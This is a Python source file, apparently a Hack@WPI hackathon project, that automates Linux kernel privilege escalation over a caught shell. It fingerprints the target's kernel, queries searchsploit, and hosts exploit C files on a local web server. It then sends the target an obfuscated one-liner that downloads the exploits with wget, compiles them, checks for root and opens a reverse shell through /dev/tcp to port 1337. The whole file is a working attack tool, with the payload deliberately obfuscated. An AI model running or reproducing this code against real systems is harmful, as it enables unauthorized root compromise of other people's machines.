# TODO
# 1) write script to send kernel version to searchsploit
# 2) parse searchsploit output for path to kernel exploit (look for dirtycow)
# 3) implement wget to download script
# 4) compile exploit and parse getuid() output to check if we are root, if not try another exploit
# 5) write CLI interface to make user interaction easy
# 6) make a webserver to host C files

import socket
import os
import re
import json
import base64
import threading
import http.server


def welcome():
    print(" /$$   /$$                     /$$           /$$$$$$     /$$      /$$ /$$$$$$$  /$$$$$$ ")
    print("| $$  | $$                    | $$         /$$$__  $$$  | $$  /$ | $$| $$__  $$|_  $$_/ ")
    print("| $$  | $$  /$$$$$$   /$$$$$$$| $$   /$$  /$$_/  \_  $$ | $$ /$$$| $$| $$  \ $$  | $$   ")
    print("| $$$$$$$$ |____  $$ /$$_____/| $$  /$$/ /$$/ /$$$$$  $$| $$/$$ $$ $$| $$$$$$$/  | $$   ")
    print("| $$__  $$  /$$$$$$$| $$      | $$$$$$/ | $$ /$$  $$| $$| $$$$_  $$$$| $$____/   | $$   ")
    print("| $$  | $$ /$$__  $$| $$      | $$_  $$ | $$| $$\ $$| $$| $$$/ \  $$$| $$        | $$   ")
    print("| $$  | $$|  $$$$$$$|  $$$$$$$| $$ \  $$| $$|  $$$$$$$$/| $$/   \  $$| $$       /$$$$$$ ")
    print("|__/  |__/ \_______/ \_______/|__/  \__/|  $$\________/ |__/     \__/|__/      |______/ ")
    print("	                                       \  $$$   /$$$                                   ")
    print("  	                                    \_  $$$$$$_/                                   ")
    print("    	                                      \______/                                     ")


# This is the code to be sent to the remote
remote_command = '''
import os
from __future__ import absolute_import
import os
import time
import re

os.popen(u"wget -r http://192.168.56.101:8080 > log.txt").read()
time.sleep(1)
#os.popen("cd 192.168.56.101:8080").read()

output = os.popen(u"ls 192.168.56.101:8080").read()

files = output.split(u"\\n")

for file in files:
    print file
    if not file.endswith(u".c"):
        continue
    compiled_filename = file.strip(u".c")

    os.system(u"gcc 192.168.56.101:8080/" + file + u" -lcrypt -m32 -o " + compiled_filename)


    user_id = os.popen(u"id").read()

    pattern = u"uid=0"
    uid_results = re.findall(pattern, user_id)

    while uid_results != []:
      os.system(u"bash -i >& /dev/tcp/192.168.56.101/1337 0>&1")
'''
remote_oneliner = "\"(lambda __g, __print, __y: (lambda __mod: (lambda __f: type(__f)(type(__f.func_code)(__f.func_code.co_argcount, __f.func_code.co_nlocals, __f.func_code.co_stacksize, __f.func_code.co_flags | __mod.absolute_import.compiler_flag, __f.func_code.co_code, __f.func_code.co_consts, __f.func_code.co_names, __f.func_code.co_varnames, __f.func_code.co_filename, __f.func_code.co_name, __f.func_code.co_firstlineno, __f.func_code.co_lnotab, __f.func_code.co_freevars, __f.func_code.co_cellvars), __f.func_globals, __f.func_name, __f.func_defaults, __f.func_closure)())(lambda: [[[[(os.popen(u'wget -r http://192.168.56.101:8080 > log.txt').read(), (time.sleep(1), [[(lambda __after, __items, __sentinel: __y(lambda __this: lambda: (lambda __i: (lambda __continue: [(__print(file), (lambda __after: __continue() if (not file.endswith(u'.c')) else __after())(lambda: [(os.system((((u'gcc 192.168.56.101:8080/' + file) + u' -lcrypt -m32 -o ') + compiled_filename)), [[[(lambda __after: __y(lambda __this: lambda: (os.system(u'bash -i >& /dev/tcp/192.168.56.101/1337 0>&1'), __this())[1] if (uid_results != []) else __after())())(lambda: __this()) for __g['uid_results'] in [(re.findall(pattern, user_id))]][0] for __g['pattern'] in [(u'uid=0')]][0] for __g['user_id'] in [(os.popen(u'id').read())]][0])[1] for __g['compiled_filename'] in [(file.strip(u'.c'))]][0]))[1] for __g['file'] in [(__i)]][0])(__this) if __i is not __sentinel else __after())(next(__items, __sentinel)))())(lambda: None, iter(files), []) for __g['files'] in [(output.split(u'\\n'))]][0] for __g['output'] in [(os.popen(u'ls 192.168.56.101:8080').read())]][0])[1])[1] for __g['re'] in [(__import__('re', __g, __g, level=0))]][0] for __g['time'] in [(__import__('time', __g, __g, level=0))]][0] for __g['os'] in [(__import__('os', __g, __g, level=0))]][0] for __g['absolute_import'] in [(__mod.absolute_import)]][0]))(__import__('__future__', __g, __g, ('absolute_import',), 0)))(globals(), __import__('__builtin__', level=0).__dict__['print'], (lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))))\""


def root_listener():
    final = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    host = "0.0.0.0"
    port = 1337

    final.bind((host, port))
    final.listen(1)
    print("Listening for root")
    connection, address = final.accept()
    print("Success!")


def webserver_listener():
    port = 8080

    handler = http.server.SimpleHTTPRequestHandler

    httpd = http.server.HTTPServer(("", port), handler)

    httpd.serve_forever()


def parse_version(kernel_version):
    pattern = "(\\d+.{1})+"
    print(kernel_version)
    data = re.search(pattern, kernel_version)
    print(kernel_version)
    # print(data[0])
    # The first element of this should be the kernel version
    return data[0]


def start_webserver(file_paths):
    print("Starting Webserver...")
    working_directory = os.popen("pwd").read()

    # for path in file_paths:
    # os.popen("cp " + path + " " + working_directory).read()
    os.popen("cp /usr/share/exploitdb/exploits/linux_x86/local/9542.c " + working_directory)
    print("Copied Files")

    print("Created Socket")
    root_thread = threading.Thread(target=root_listener)
    root_thread.start()

    web_thread = threading.Thread(target=webserver_listener)
    web_thread.start()


def parse_searchsploit_output(possible_exploits,
                              version):  # parse possible exploits for reliable exploits and get paths to host

    version = version.replace(".", "\\.")  # Maybe?
    pattern = "\\w*(?<![\\d\\.])" + version  # Look for "2.4.* NOT *.2.4"

    # Look through JSON, iterate through each Title field, parse version.
    search_json = json.loads(possible_exploits)
    print("Loaded JSON")
    search_json = search_json["RESULTS_EXPLOIT"]

    exploit_paths = []

    for exploit in search_json:
        title = exploit["Title"]
        results = re.findall(pattern, title)

        if len(results) != 0:
            print("Found Exploit")
            path = exploit["Path"]
            exploit_paths.append(path)

    start_webserver(exploit_paths)


def exploit_lookup(parsed_data, version):
    command = "searchsploit " + parsed_data + " -j"
    print("Looking Up...")

    possible_exploits = os.popen(command).read()
    print("Got Possible Exploits")
    parse_searchsploit_output(possible_exploits, version)


def start_listener():
    host = "0.0.0.0"
    port = int(input("[Hack@WPI] Enter the port to listen on: "))
    command = "uname -a > 'file.txt'\n"

    socket_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket_listener.bind((host, port))
    socket_listener.listen(5)  # allow up to 5 connections

    conn, addr = socket_listener.accept()

    with conn:
        print("[Hack@WPI] Connection from: ", addr)

        conn.sendall("cd /tmp\n".encode('utf-8'))

        conn.sendall(command.encode('utf-8'))

        comm2 = "cat file.txt\n"

        conn.sendall(comm2.encode('utf-8'))

        test = conn.recv(1024).decode('utf-8')
        test += conn.recv(1024).decode('utf-8')
        test += conn.recv(1024).decode('utf-8')
        test += conn.recv(1024).decode('utf-8')
        # test += conn.recv(1024).decode('utf-8')

        print(test)

        test_split = test.split("\n")
        kernel_version = test

        '''
        for string in test_split:
            if string.startswith("Linux "):
                kernel_version = string
                break
        print(kernel_version)
        '''

        parsed_data = parse_version(kernel_version)
        print("Parsed Version")
        search_params = "Linux Kernel " + parsed_data
        exploit_lookup(search_params, parsed_data)

        ip = socket.gethostbyname(socket.gethostname())

        wget_command = "wget -r http://" + ip + " /tmp\n"
        conn.sendall(wget_command.encode('utf-8'))

        ls_command = "cd /tmp\n"
        conn.sendall(ls_command.encode('utf-8'))

        # remote_encoded = str(base64.b64encode(remote_command.encode('utf-8')))[2:-1]
        remote_encoded = remote_oneliner

        send_command = "echo " + remote_encoded + " > script.py\n"
        conn.sendall(send_command.encode('utf-8'))

        second_command = "python script.py\n"
        conn.sendall(second_command.encode('utf-8'))

        while 1:
            pass


# main function
def main():
    welcome()
    start_listener()


if __name__ == '__main__':
    main()